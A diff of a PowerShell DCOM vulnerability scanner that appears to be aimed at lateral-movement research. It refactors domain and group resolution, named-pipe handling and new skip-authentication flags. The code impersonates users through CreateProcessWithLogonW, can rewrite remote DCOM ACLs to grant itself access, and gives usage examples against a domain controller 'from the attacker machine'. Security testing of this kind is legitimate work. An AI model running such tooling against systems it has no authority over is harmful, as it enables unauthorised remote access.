@@ -8,23 +8,22 @@ The author or any Internet provider bears NO responsibility for misuse of this t
 By using this you accept the fact that any damage caused by the use of this tool is your responsibility.
 #>
 
+# Add NetAPI libraries
+        Add-Type -MemberDefinition @"
+        [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern uint NetApiBufferFree(IntPtr Buffer);
+        [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern int NetGetJoinInformation(
+          string server,
+          out IntPtr NameBuffer,
+      out int BufferType);
+"@ -Namespace Win32Api -Name NetApi32
 
 $global:debug = $false # When debug is on, youll see the communication between the namedpipe server with our namedpipe client
 $global:NamedPipe = "DVS" # Namedpipe name
 $global:NamedpipeResponseTimeout = 5 # Namedpipe communication timeout
 $global:converter = New-Object System.Management.ManagementClass Win32_SecurityDescriptorHelper # Security Descriptor converter
 $global:SleepMilisecondsTime = 50 # How long time to sleep until get response
-
-
-$global:NativeFunctions = @( # Collects all builtin functions in order to skip them
-                            [System.String](""), [System.Int32](1), [System.Boolean]($true),
-                            [System.Array](1,2), @{"A"="B"}
-                            )|ForEach {
-    $_.psobject.Members|ForEach {
-        %{$_.Name}
-    }
-}| Select -Unique
-
 
 <# Access mask calculation:
 
@@ -85,6 +84,16 @@ $global:ResultsFileName = "$($(Get-Location).Path)\results.csv"
 
 # Regex to identify IP address
 [regex]$global:IPRegex = '^(?:(?:(?:\d{0,3}\.){3})\d)$'
+
+# Collects all builtin functions in order to skip them
+$global:NativeFunctions = @( 
+                            [System.String](""), [System.Int32](1), [System.Boolean]($true),
+                            [System.Array](1,2), @{"A"="B"}, (New-Object PSObject)
+                            )|ForEach {
+    $_.psobject.Members|ForEach {
+        %{$_.Name}
+    }
+}| Select -Unique
 
 # General function list
 
@@ -406,7 +415,7 @@ Function Enum-HostList {
     $IPAddressList = Get-MachineIPAddresses
     foreach($HostItem in $HostList.Split(",")) {
         $HostItem = $HostItem.Trim()
-        if(!($HostItem -match $global:IPRegex)) {
+        if(!($HostItem -match $global:IPRegex -or $HostItem.Contains("/"))) {
             $IPAddress = Get-GetHostByName($HostItem)
             if(Find-InArray -Content $IPAddress -Array $IPAddressList) {
                 % { "127.0.0.1"}
@@ -416,10 +425,6 @@ Function Enum-HostList {
             continue
         }
         if(!($HostItem.Contains("/"))) {
-            if(Find-InArray -Content $HostItem -Array $IPAddressList) {
-                % { "127.0.0.1"}
-                continue
-            }
             %{$HostItem}
             continue
         }
@@ -442,13 +447,39 @@ Function Enum-HostList {
     }
 }
 
-function Get-DomainNameFromRemoteRegistry {
+function Get-DomainNameFromRemoteRegistryHKLM {
     [CmdletBinding(SupportsShouldProcess=$true)]
     [OutputType([string])]
     param()
 
     # Resolve domain name from using registry
-    return (Read-RegString -Key "System\CurrentControlSet\Services\Tcpip\Parameters" -Value "Domain").ToLower().Split(".")[0]
+    if($global:ChoosenHive -eq "HKLM") {
+        try {
+            return (Read-RegString -Key "System\CurrentControlSet\Services\Tcpip\Parameters" -Value "Domain").ToLower().Split(".")[0]
+        } catch {
+            Write-Log -Level ERROR -Message $_ -forceVerbose
+            return ""
+        }
+    }
+    return ""
+    
+}
+
+function Get-DomainNameFromRemoteRegistryHKCU {
+    [CmdletBinding(SupportsShouldProcess=$true)]
+    [OutputType([string])]
+    param()
+    # Resolve domain name from using registry
+    if($global:ChoosenHive -eq "HKCU") {
+        try {
+            return (Read-RegString -Key "Volatile Environment" -Value "USERDOMAIN").ToLower()
+        } catch {
+            Write-Log -Level ERROR -Message $_ -forceVerbose
+            return ""
+        }
+    }
+    return ""
+    
 }
 
 function Get-DomainNameFromRemoteNetBIOS {
@@ -461,16 +492,6 @@ function Get-DomainNameFromRemoteNetBIOS {
     # This function is responsible to resolve domain name via remote NetBIOS over TCP (like nbtstat)
 
     try {
-        # Add NetAPI libraries
-        Add-Type -MemberDefinition @"
-        [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-        public static extern uint NetApiBufferFree(IntPtr Buffer);
-        [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-        public static extern int NetGetJoinInformation(
-          string server,
-          out IntPtr NameBuffer,
-      out int BufferType);
-"@ -Namespace Win32Api -Name NetApi32
         $pNameBuffer = [IntPtr]::Zero
         $joinStatus = 0
         $apiResult = [Win32Api.NetApi32]::NetGetJoinInformation(
@@ -500,19 +521,32 @@ function Get-DomainNameFromRemoteMachine {
 
     <#
         This function is responsible to resolve the domain name from the remote machine using Get-DomainNameFromRemoteNetBIOS function.
-        If it fails, it will try to resolve it using Get-DomainNameFromRemoteRegistry function.
+        If it fails, it will try to resolve it using DomainNameFromRemoteRegistryHKLM function
+        if it fails, it will try to resole it using DomainNameFromRemoteRegistryHKCU.
     #>
     if(!$global:RemoteDomain) {
-        
         $DomainName = Get-DomainNameFromRemoteNetBIOS -RemoteIP $RemoteIP
-        if(!$DomainName) {
-            $DomainName = Get-DomainNameFromRemoteRegistry
-        }
         if($DomainName) {
-            Write-Log -Level VERBOSE -Message "Remote Domain: $($DomainName)"
+            Write-Log -Level VERBOSE -Message "Remote Domain: $($DomainName) | Technique: NetBIOS"
             $global:RemoteDomain = $DomainName
+            return $DomainName
+        }
+
+        $DomainName = Get-DomainNameFromRemoteRegistryHKLM
+        if($DomainName) {
+            Write-Log -Level VERBOSE -Message "Remote Domain: $($DomainName) | Technique: Registry (HKLM)"
+            $global:RemoteDomain = $DomainName
+            return $DomainName
+        }
+
+        $DomainName = Get-DomainNameFromRemoteRegistryHKCU
+        if($DomainName) {
+            Write-Log -Level VERBOSE -Message "Remote Domain: $($DomainName) | Technique: Registry (HKCU)"
+            $global:RemoteDomain = $DomainName
+            return $DomainName
         }
     }
+
     return $global:RemoteDomain
 }
 
@@ -536,10 +570,19 @@ function Get-userSID {
 
     # This function is responsible to resolve the user SID using WindowsIdentity feature, if it fails, it will try to produce it using ADSI protocool
 
-    # If the user that needs to be analyzed is in the same domain environment, try to resolve the groups using the windows-identity feature
+    
     
     if(Find-InArray -Content $Username -Array $global:UserSIDList.Keys) {
         return $global:UserSIDList[$Username]
+    }
+
+    # If the user that needs to be analyzed is in the same domain environment, try to resolve the groups using ASDI protocol
+
+    $SID = Get-UserSIDUsingADSI -RemoteIP $RemoteIP -Username $Username
+    if($SID) {
+        Write-Log -Level VERBOSE -Message "$($Username) resolved user SID using ADSI"
+        $global:UserSIDList[$Username] = $SID
+        return $SID
     }
     
     if(is-DomainJoinedUserSession -RemoteIP $RemoteIP) {
@@ -556,13 +599,8 @@ function Get-userSID {
             Write-Log -Level ERROR -Message $_ -forceVerbose
         }
     }
-    # If fails, or the user is not domained-joined, try to resolve groups using ASDI protocol.
-    $SID = Get-UserSIDUsingADSI -RemoteIP $RemoteIP -Username $Username
-    if($SID) {
-        Write-Log -Level VERBOSE -Message "$($Username) resolved user SID using ADSI"
-        $global:UserSIDList[$Username] = $SID
-        return $SID
-    }
+    # If fails, or the user is not domained-joined, try to resolve groups using the windows-identity feature.
+    
     Write-Log -Level ERROR -Message "Can't resolve user SID"
     return $false
     
@@ -617,12 +655,35 @@ function Get-UserGroupsUsingWindowsIdentity {
             if($groupName.Contains("NT AUTHORITY\") -or ($groupName -ceq $groupName.ToUpper())) {
                 continue
             }
-            %{@{GroupName=$GroupName; SID=$sid.Value}}
+            $global:GroupSIDList[$GroupName] = $sid.Value
+            %{ $sid.Value }
         
         } catch {
             continue
         }
     }
+}
+
+function Get-UserToken {
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$Username
+    )
+    try {
+        return [System.Security.Principal.WindowsIdentity]($Username)
+    } catch {
+        Write-Log -Level ERROR -Message $_ -forceVerbose
+        return $false
+    }
+    
+}
+
+function Check-Username {
+    [OutputType([string])]
+    param(
+        [string]$Username
+    )
+    return (Iif -Condition $Username -Right $Username.Replace("/", "\") -Wrong "$($env:USERDOMAIN)\$($env:USERNAME)")
 }
 
 function Get-UserGroup {
@@ -635,40 +696,35 @@ function Get-UserGroup {
         [string]$Username # Gets username without domain-name
 
     )
-    $EveryoneSID = Get-GroupSID -RemoteIP $RemoteIP -GroupName "Everyone"
-    $global:GroupSIDList["Everyone"] = $EveryoneSID
-    %{ $EveryoneSID }
-    
+
+    %{ (Get-GroupSID -RemoteIP $RemoteIP -GroupName "Everyone") }
+
     # Try to resolve groups using ASDI protocol.
     $res = Get-UserGroupsUsingADSI -RemoteIP $RemoteIP -Username $Username
     if($res) {
-        $res|Foreach {
-            $global:GroupSIDList[$_.GroupName] = $_.SID
-            %{ $_.SID }
-        }
         Write-Log -Level VERBOSE -Message "Resolved user groups using ADSI (Identity: $($Username))"
-        return
+        return $res
     }
 
     # Try to resolve groups using WindowsIdentity.
-    try {
-        Get-UserGroupsUsingWindowsIdentity -Token ([System.Security.Principal.WindowsIdentity]($Username))|Foreach {   
-            $global:GroupSIDList[$_.GroupName] = $_.SID
-            %{ $_.SID }
+    if(is-DomainJoinedUserSession -RemoteIP $RemoteIP) {
+        $Token = Get-UserToken -Username $Username
+        if($Token) {
+            Get-UserGroupsUsingWindowsIdentity -Token $Token
+            Write-Log -Level VERBOSE -Message "Resolved user groups using WindowsIdentity (Identity: $($Username))"
+            return
         }
-        return
-    } catch {
-        Write-Log -Level ERROR -Message $_ -forceVerbose
+        
+
+        if($Username -eq $env:USERNAME) {
+            # Try to resolve groups using WindowsIdentity using current session.
+            Get-UserGroupsUsingWindowsIdentity -Token ([System.Security.Principal.WindowsIdentity]::GetCurrent())
+            Write-Log -Level VERBOSE -Message "Resolved user groups using WindowsIdentity (Identity: $($Username) (Current session groups))"
+            return
+        }
+        Write-Log -Level VERBOSE -Message "Can't resolve user groups, trying to guess groups."
     }
 
-    Write-Log -Level VERBOSE -Message "Can't resolve user groups, trying to guess groups."
-    # If fails, and the user is the current user, gets the groups from the current session
-    if($Username -eq $env:USERNAME -and (is-DomainJoinedUserSession -RemoteIP $RemoteIP)) {
-        Get-UserGroupsUsingWindowsIdentity -Token ([System.Security.Principal.WindowsIdentity]::GetCurrent())|Foreach {
-            %{$_.SID}
-        }
-        return
-    }
     # If fails, try to guess the groups.
     @((Get-userSID -RemoteIP $RemoteIP -Username $Username), (Get-GroupSID -RemoteIP $RemoteIP -GroupName "Users"))|Foreach {
         % { $_ }
@@ -789,7 +845,7 @@ function Start-ImpersonationSession {
     $ProcessInfo = New-Object PROCESS_INFORMATION
     
     # CreateProcessWithLogonW --> lpCurrentDirectory
-    $GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
+    $GetCurrentPath = (Get-Item -Path ".\").FullName
     $CallResult = [Advapi32]::CreateProcessWithLogonW(
         $Username.Split("\")[-1], $Domain, $Password, (Iif -Condition $NetOnly -Right 0x2 -Wrong 0x1), 
         $Filename, $Arguments, 0x04000000, $null, $GetCurrentPath,
@@ -1822,7 +1878,6 @@ function Start-DefaultTasks {
         [string]$Password,
         [ValidateSet("Init", "StartTask", "TaskChecks", "EndTask", "Finish")]
         [string]$Type,
-        [switch]$NoAuth,
         [switch]$AutoGrant
     )
     # This function is responsible to clear the cached information, perform registry negotiation, and every repetative task in each of the exported functions.
@@ -1841,14 +1896,11 @@ function Start-DefaultTasks {
             $global:VulnerableMatchList = New-Object System.Collections.ArrayList # Vulnerable Functions patterns(contains "*")
             $global:StopWatch = New-Object -TypeName System.Diagnostics.Stopwatch # Configure stop watch
             $global:StopWatch.Start()
-            
             $global:isNamedpipeStarted = $false
-            $global:usergroups = $null
-            $global:AllowedRegistryGroups = $null
-            $global:RegAuthenticationMethod = $null
-            $global:RemoteDomain = $null
+            $global:totalResults = @{} # Count total results for each object
+            $global:CachedObjectList = @{} # Cached DCOM object information list
             $global:isResultsExists = $false # A flag that indicates if there is results.
-
+            $global:isNamedpipeStarted = $false
         }
 
         "StartTask" {
@@ -1857,60 +1909,46 @@ function Start-DefaultTasks {
             $global:Producer.Clear()|Out-Null
             $global:UserSIDList.Clear()|Out-Null
             $global:GroupSIDList.Clear()|Out-Null
+            $global:ChoosenHive = ""
+            $global:RemoteDomain = $null
+            $global:RegAuthenticationMethod = $null
             $global:IsDCOMStatusChanged = $false # If DCOM Is not enabled on the machine and we enable it, restore it
             $global:aclSnapshots = New-Object System.Collections.ArrayList # ACLs snapshot list in order to store SDDL snapshots for each registry key (For further reverting operation to the previous machine state)
             $global:AppIDDictionary = New-Object @{} # Collected AppID list from SOFTWARE\Classes\Wow6432Node\AppID and SOFTWARE\Classes\Wow6432Node\AppID
-            $global:totalResults = @{} # Count total results for each object
-            $global:CachedObjectList = @{} # Cached DCOM object information list
+            $global:totalResults.Clear() # Clear total results
+            $global:CachedObjectList.Clear() # Clear cached DCOM object information list
+            if(!(Start-NamedPipe-Server -Username $Username -Password $Password)) { # Initiate namedpipe server
+                return $false 
+            }
+            if(!(Start-NamedpipeListener)) {
+                return $false
+            }
+            $global:isNamedpipeStarted = $true
+            Write-Log -Level INFO -Message "Working on $($RemoteIP) address"
             
-        }
-        
-        "TaskChecks" {
-            
-            if($Username) {
-                $Username = $Username.Replace("/", "\")
-            } else {
-                $Username = $env:USERNAME
-            }
-            
-            # Initiate namedpipe server one time.
-            if(!$global:isNamedpipeStarted) {
-                if(!(Start-NamedPipe-Server -Username $Username -Password $Password)) {
-                    
-                    return $false
-                }
-                if(!(Start-NamedpipeListener)) {
-                    return $false
-                }
-                $global:isNamedpipeStarted = $true
-            }
-            Write-Log -Level INFO -Message "IP Address: $($RemoteIP)"
-            if(!$NoAuth) {
-                if(!(Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKLM)) {
-                    return $false
-                }
-
-                if(!(Test-DCOMStatus -AutoGrant:$AutoGrant) -and !$Force) {
-                    return $false
-                }
-                
-            }
-
-            if(!$global:usergroups) {
-                $global:usergroups = Get-UserGroup -RemoteIP $RemoteIP -Username $Username.Split("\")[-1]
-            }
-            return $true
-        
         }
 
         "EndTask" {
+            if(!$global:isNamedpipeStarted) {
+                return $true
+            }
+            if(Quit-COMObject) {
+                Write-Log -Level VERBOSE -Message "COM Object quitted successfully"
+            }
+            if($AutoGrant) {
+                Rev2Self
+            }
+            Write-Log -Level INFO -Message "Close Namedpipe server, please wait!"
+            if($global:ps -and $global:handle) {
+                Close-NamedPipeClient -ps $global:ps -handle $global:handle
+            }
             [System.GC]::Collect() # perform garbage collection in order to release memory
         }
 
         "Finish" {
-            Write-Log -Level INFO -Message "Close Namedpipe server, please wait!"
-            if($global:isNamedpipeStarted -and $global:ps -and $global:handle) {
-                Close-NamedPipeClient -ps $global:ps -handle $global:handle
+            Write-Log -Level INFO -Message "[+] Log file location: ($global:LogFileName)"
+            if($global:ResultsStream) {
+                Write-Log -Level INFO -Message "[+] Results file location: ($global:ResultsFileName)"
             }
 
             $global:StopWatch.Stop()
@@ -2018,12 +2056,20 @@ Function Add-Result {
         [Parameter(Mandatory=$True)]
         [string]$RemoteIP,
         [string]$OverloadDefinitions,
-        [switch]$CheckAccessOnly
+        [switch]$CheckAccessOnly,
+        [switch]$SkipRegAuth
     )
     # This function is responsible to collect and store the results
 
-    
-    $clsid, $ProgID, $ProgName, $Library_32, $Library_64 = Get-ObjectInfo -ObjectName $ObjectName # Collect object info
+    if($SkipRegAuth) {
+        if(is-GUID -ObjectName $ObjectName) {
+            $clsid, $ProgID, $ProgName, $Library_32, $Library_64 = @($ObjectName, "", "", "", "")
+        } else {
+            $clsid, $ProgID, $ProgName, $Library_32, $Library_64 = @("", $ObjectName, "", "", "")
+        }
+    } else {
+        $clsid, $ProgID, $ProgName, $Library_32, $Library_64 = Get-ObjectInfo -ObjectName $ObjectName # Collect object info
+    }
     ForEach($handleType in @("ProgID", "CLSID")) {  # Generates execution commands
         if($CheckAccessOnly) { # If CheckAccessOnly mode is on, dont try to get invoke command (Duo to the fact e dont have the object path)
             Set-Variable -Name "$($handleType)Command" -Value ""
@@ -2033,7 +2079,7 @@ Function Add-Result {
         if(!$objName) {
             continue
         }
-        $cmd = _Generate-ExecutionCommand -ObjectName $objName -ObjectPath $ObjectPath -OverloadDefinitions $OverloadDefinitions
+        $cmd = _Generate-ExecutionCommand -ObjectName $objName -ObjectPath $ObjectPath -OverloadDefinitions $OverloadDefinitions -forceVerbose
         Set-Variable -Name "$($handleType)Command" -Value $cmd
     }
 
@@ -2220,6 +2266,7 @@ function Test-RegistryConnection {
     if(is-LoopBack -RemoteIP $RemoteIP) {
         $RemoteIP = $env:COMPUTERNAME
     }
+    $global:ChoosenHive = $Hive
     Write-Log -Level VERBOSE -Message "Trying to interact with $($RemoteIP) using $($Hive) Hive"
     # This function is checking accessibility with Registry using wmi or remote-registry features
     $global:RegAuthenticationMethod = "RemoteRegistry"
@@ -2826,8 +2873,7 @@ function Invoke-SecurityRightAnalyzer {
         [bool]$DefaultResult,
         [Parameter(Mandatory = $true)]
         [string]$RemoteIP,
-        [switch]$AutoGrant,
-        [switch]$forceVerbose
+        [switch]$AutoGrant
     )
     <#
         This function is responsible to check if our identity has the permissions to access and launch remote/local DCOM Object.
@@ -2861,7 +2907,7 @@ function Invoke-SecurityRightAnalyzer {
             $RequiredRights = Iif -Condition ($PermisisonType -eq "Launch") -Right $global:RemoteLaunchAndActivationRights -Wrong $global:RemoteAccessRights
         }
         $Groups = $global:usergroups
-        if($PermisisonType -eq "Access" -and (!(is-DomainJoinedUserSession - $RemoteIP))) {
+        if($PermisisonType -eq "Access" -and (!(is-DomainJoinedUserSession -RemoteIP $RemoteIP))) {
             $Groups = @(Get-GroupSID -RemoteIP $RemoteIP -GroupName "Everyone")
         }
         if(Test-ACLPermission -RemoteIP $RemoteIP -DACL $DACL -RequiredRights $RequiredRights -Groups $Groups) {
@@ -2877,7 +2923,7 @@ function Invoke-SecurityRightAnalyzer {
             }
             $global:aclSnapshots.Add(@{Path=$Path; Value=$record; SDDL=$ACL.sddl})|Out-Null # Store SDDL Before attack
             if(!(Patch-ACL -ACL $ACL -Path $Path -Value $record)) { # If the patching operation fails, remove the last snapshot
-                Write-Log -Level ERROR "Patching $($Path)\$($record) permissions Failed" -forceVerbose:$forceVerbose
+                Write-Log -Level ERROR "Patching $($Path)\$($record) permissions Failed" -forceVerbose
                 $global:aclSnapshots.RemoveAt($global:aclSnapshots.Count-1)| Out-Null
                 continue
             }
@@ -2900,8 +2946,7 @@ function Invoke-DefaultRightAnalyzer {
     param(
         [Parameter(Mandatory=$true)]
         [string]$RemoteIP,
-        [switch]$AutoGrant,
-        [switch]$forceVerbose
+        [switch]$AutoGrant
     )
     <#
         This function is responsible to check if we have the default relevant rights to access the DCOM Object.
@@ -2916,7 +2961,7 @@ function Invoke-DefaultRightAnalyzer {
         $PermissionStatus['DefaultAccessPermission'] = @{Status=$false; "Type"="Access"};
         $PermissionStatus['MachineAccessRestriction'] = @{Status=$false; "Type"="Access"};
     }
-    $status = Invoke-SecurityRightAnalyzer -Path "SOFTWARE\Microsoft\Ole" -PermissionHashTable $PermissionStatus -RemoteIP $RemoteIP -DefaultResult $false -AutoGrant:$AutoGrant -forceVerbose:$forceVerbose
+    $status = Invoke-SecurityRightAnalyzer -Path "SOFTWARE\Microsoft\Ole" -PermissionHashTable $PermissionStatus -RemoteIP $RemoteIP -DefaultResult $false -AutoGrant:$AutoGrant
     if($status) {
         Write-Log -Level VERBOSE -Message "Your identity is granted launch and access DCOM objects with default configuration!"
     }
@@ -2932,8 +2977,7 @@ function Invoke-DCOMObjectRightAnalyzer {
         [Parameter(Mandatory=$true)]
         [string]$RemoteIP,
         [switch]$DefaultChecks,
-        [switch]$AutoGrant,
-        [switch]$forceVerbose
+        [switch]$AutoGrant
     )
     
     <#
@@ -2944,7 +2988,7 @@ function Invoke-DCOMObjectRightAnalyzer {
     if(!(is-GUID -ObjectName $objectName)) { # If the ObjectName is not CLSID, fetch it
         $clsid = Get-CLSID -ProgID $ObjectName
         if(!$clsid) {
-            Write-Log -Level ERROR -Message "Can't reach $($clsid) object!" -forceVerbose:$forceVerbose
+            Write-Log -Level ERROR -Message "Can't reach $($clsid) object!" -forceVerbose
             return
         }
     } else {
@@ -2974,7 +3018,7 @@ function Invoke-DCOMObjectRightAnalyzer {
         return $DefaultChecks
     }
 
-    $status = Invoke-SecurityRightAnalyzer -RemoteIP $RemoteIP -Path $ObjectPath -PermissionHashTable $PermissionStatus -AutoGrant:$AutoGrant -DefaultResult $DefaultChecks -forceVerbose:$forceVerbose
+    $status = Invoke-SecurityRightAnalyzer -RemoteIP $RemoteIP -Path $ObjectPath -PermissionHashTable $PermissionStatus -AutoGrant:$AutoGrant -DefaultResult $DefaultChecks
     
     if($status) {
         Write-Log -Level VERBOSE -Message "Your identity is granted to launch and access the $($ObjectName) object!sssss"
@@ -3014,7 +3058,12 @@ function Get-UserGroupsUsingADSI {
     )
     $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Get-UserGroupsUsingADSI"; Arguments=@{RemoteIP=[string]$RemoteIP; Username=$Username}}
     if([bool]$res.IsSuccess) {
-        return [System.Array]$res.Result
+        Write-Log -Level VERBOSE -Message "Resolved user groups using ADSI (Identity: $($Username))"
+        $res.Result|Foreach {
+            $global:GroupSIDList[$_.GroupName] = $_.SID
+            %{ $_.SID }
+        }
+        return
     }
     return [System.Array]@()
     
@@ -3198,39 +3247,23 @@ function Invoke-DCOMAnalyzer {
         [string]$ObjectPath = "",
         [Parameter(Mandatory = $true)]
         [string]$RemoteIP,
-        [string]$Username,
-        [string]$Password,
         [System.Int32]$MaxResults=0,
-        [switch]$AutoGrant,
-        [switch]$CheckAccessOnly,
-        [switch]$DefaultChecks,
-        [switch]$NoAuth,
-        [switch]$Force
+        [switch]$SkipRegAuth,
+        [switch]$CheckAccessOnly
     )
     # This function is responsible to probe and analyze DCOM access, then create a DCOM object and enumerate it
-    $ObjectName = Wrap-CLSID -ObjectName $ObjectName
-    if(!$NoAuth) { # If NoAuth mode is applied, dont probe security rights   
-        $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $ObjectName -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant -forceVerbose
-        if(!$Force -and ((!$DefaultChecks -and !$CLSIDChecks) -or ($DefaultChecks -and !$CLSIDChecks))) {
-            Write-Log -Level ERROR -Message "You dont have permissions to access $($ObjectName) object!"
-            return
-        }
-    }
+    
     if(!(Start-COMObjectInstance -ObjectName $ObjectName -RemoteIP $RemoteIP)) { # if the object is unresolvable, return
         return
     }
+    Write-Log -Level INFO -Message  "Scanning $($ObjectName) object.."
     if($CheckAccessOnly) { # if CheckAccessOnly flagged, add the object name to the results file and finish
-        if($NoAuth) {
-            $clsid, $ProgID = Iif -Condition (is-GUID -ObjectName $ObjectName) -Right @($ObjectName, $false) -Wrong @($false, $ObjectName)
-            Add-ResultRow -ResultRow @($RemoteIP, "", $clsid, $ProgID, "", "", "", "", "")
-            return
-        }
-        Add-Result -ObjectName $ObjectName -ObjectPath "" -RemoteIP $RemoteIP -CheckAccessOnly
+        Add-Result -ObjectName $ObjectName -ObjectPath "" -RemoteIP $RemoteIP -CheckAccessOnly -SkipRegAuth:$SkipRegAuth
         return
     }
     try {
         $Blacklist = New-Object System.Collections.ArrayList # Path blacklist in order to prevent race conditions
-        Enumerate-DCOMObject -Blacklist $Blacklist -ObjectName $ObjectName -MaxDepth $MaxDepth -RemoteIP $RemoteIP -MaxResults $MaxResults|Out-Null
+        Enumerate-DCOMObject -Blacklist $Blacklist -ObjectName $ObjectName -MaxDepth $MaxDepth -RemoteIP $RemoteIP -MaxResults $MaxResults -SkipRegAuth:$SkipRegAuth|Out-Null
     } catch {
         Write-Log -Level ERROR -Message $_
     }
@@ -3252,7 +3285,8 @@ function Enumerate-DCOMObject {
         [System.Int32]$CurrentDepth = 0,
         [System.Int32]$MaxResults=0,
         [Parameter(Mandatory = $true)]
-        [string]$RemoteIP
+        [string]$RemoteIP,
+        [switch]$SkipRegAuth
     )
     try {
         # This function is responsible to enumerate COM objects recursive until the depth is equal to the MaxDepth
@@ -3271,7 +3305,7 @@ function Enumerate-DCOMObject {
         }
         foreach($MemberInfo in (Get-Object-Info -ObjectPath $FullObjectPath| Sort-Object {Get-Random})) {
             if(is-MaxResultsReached -ObjectName $ObjectName -MaxResults $MaxResults) { # If the max results is reached, break the loop.
-                break
+                return
             }
             # If property is empty, continue to the next property
             if(!$MemberInfo.Name) {
@@ -3301,13 +3335,13 @@ function Enumerate-DCOMObject {
                     continue
                 }
                 $ResultsPath = Iif -Condition $FullObjectPath -Right "$($FullObjectPath).$($MemberInfo.Name)" -Wrong $MemberInfo.Name
-                Add-Result -ObjectName $ObjectName -ObjectPath $ResultsPath -RemoteIP $RemoteIP -OverloadDefinitions $OverloadDefinitions
+                Add-Result -ObjectName $ObjectName -ObjectPath $ResultsPath -RemoteIP $RemoteIP -OverloadDefinitions $OverloadDefinitions -SkipRegAuth:$SkipRegAuth
                 continue         
                     
             }
             $ClonedBlacklist = {$($Blacklist|?{$_})}.Invoke()
             $ClonedBlacklist.Add($MemberInfo.Name)| Out-Null # Add the property to the blacklist
-            Enumerate-DCOMObject -MaxResults $MaxResults -Blacklist $ClonedBlacklist -PropertyName $MemberInfo.Name -ObjectPath $FullObjectPath -ObjectName $ObjectName -MaxDepth $MaxDepth -CurrentDepth $CurrentDepth -RemoteIP $RemoteIP
+            Enumerate-DCOMObject -MaxResults $MaxResults -Blacklist $ClonedBlacklist -PropertyName $MemberInfo.Name -ObjectPath $FullObjectPath -ObjectName $ObjectName -MaxDepth $MaxDepth -CurrentDepth $CurrentDepth -RemoteIP $RemoteIP -SkipRegAuth:$SkipRegAuth
 
         }
 
@@ -3358,39 +3392,47 @@ function Invoke-DCOMObjectScan {
         Specifies the exact DCOM Object to scan (Available only on "Single" type).
 
         .PARAMETER Username
-        Specifies the username to use for remote-registry authentication (Not available on NoAuth mode).
+        Specifies the username to use for access.
+        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session
 
         .PARAMETER Password
-        Specifies the password to use for remote-registry authentication (Not available on NoAuth mode).
+        Specifies the password to use for access.
+        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session
 
         .PARAMETER AutoGrant
         AutoGrant mode allows you to grant yourself permission to the remote DCOM object.
-        (This is required when don't have the rights to interact with the DCOM object (Not available on NoAuth mode)).
+        (This is required when don't have the rights to interact with the DCOM object (Not available on SkipRegAuth mode)).
         Windows allows by default the following ACTIVE SESSIONS:
             Administrators
             System
 
-        .PARAMETER Force
-        This mode will attempt to access a DCOM object even if the tool assumes that the principal-identity doesn't have access to it.
-        This flag is created to solve the edge-case in which the tool can't resolve the groups the current logged-on/provided user is a member of.
-        For example: When an endpoint is used which is not domain joined and the tool can't resolve group which the user is a member of, then, the tool will assume that the user is only a member of "Everyone" group.
-
-
         .PARAMETER CheckAccessOnly
-        Show you only accessible DCOM objects without scanning (Analyze the remote SDDL for each object via remote-registry)
+        Show you only accessible DCOM objects without scanning.
 
-        .PARAMETER NoAuth
-        Try to blindly launch the remote object, without checking access to it using remote-registry
+        .PARAMETER SkipPermissionChecks
+        Try to blindly launch the remote object, without checking if the principal-identity have access to it using (Will not analyze ACL permissions).
+        This flag is created to solve the edge-case in which the tool have read access to the HKLM Hive, but can't resolve the groups the current logged-on/provided user is a member of.
 
+        .PARAMETER SkipRegAuth
+        Skip registry access (Solve the edge-case when you have access to the machine, but not have read access to the HKLM Hive)
+        Note: this flag is not available on the "All" type, due to the fact that it needs to interact with the registry of the remote machine,
+        also, the tool will not analyze ACL permissions, and when the tool will success, it will resolve all the information about the object, except the details mentioned on the registry(Like object name, executable file, etc.)
+       
         .PARAMETER Verbose
         Get Verbose logging
 
         .EXAMPLE
 
-        Check whether the "MMC20.Application" (ProgID) object is accessible from the attacker machine to the "DC01" host without first querying and verifying the access list of the DCOM object.
-        Note: -NoAuth is not eligible on type "All" due to the fact that it needs to interact with the registry of the remote machine.
+        Enumerates and Scan "MMC20.Application" (ProgID) object from the attacker machine to the "DC01" host without querying the registry.
 
-        PS> Invoke-DCOMObjectScan -Type Single -ObjectName "MMC20.Application" -HostList DC01 -NoAuth -CheckAccessOnly -Verbose
+        PS> Invoke-DCOMObjectScan -Type Single -ObjectName "MMC20.Application" -HostList DC01 -SkipRegAuth -Username "lab\administrator" -Password "Aa123456!" -Verbose
+        Note: The tool will not analyze ACL permissions, and when the tool will success, it will resolve all the information about the object, except the details mentioned on the registry(Like object name, executable file, etc.)
+
+        .EXAMPLE
+
+        Check whether the "MMC20.Application" (ProgID) object is accessible from the attacker machine to the "DC01" host without first querying and verifying the access list of the DCOM object.
+
+        PS> Invoke-DCOMObjectScan -Type Single -ObjectName "MMC20.Application" -HostList DC01 -SkipPermissionChecks -CheckAccessOnly -Verbose
 
         .EXAMPLE
 
@@ -3400,7 +3442,7 @@ function Invoke-DCOMObjectScan {
 
         .EXAMPLE
 
-        Validates if the "{00020812-0000-0000-C000-000000000046}" CLSID through 10.211.55.4 ip range object exists and accessible. If exists, the tool will enumerate the information about it. (By using lab\administrator credentials).
+        Validates if the "{00020812-0000-0000-C000-000000000046}" CLSID through 10.211.55.4 ip range object exists and accessible. If exists, the tool will resolve the information about it. (By using lab\administrator credentials).
         
         PS> Invoke-DCOMObjectScan -Type Single -ObjectName "{00020812-0000-0000-C000-000000000046}" -Hostlist "10.211.55.4" -CheckAccessOnly -Username "lab\administrator" -Password "Aa123456!" -Verbose
 
@@ -3412,16 +3454,13 @@ function Invoke-DCOMObjectScan {
         AutoGrant mode: If we don't have access to the object or if the DCOM feature is disabled, enable the DCOM feature and perform automatic grant to the relevant DCOM object.
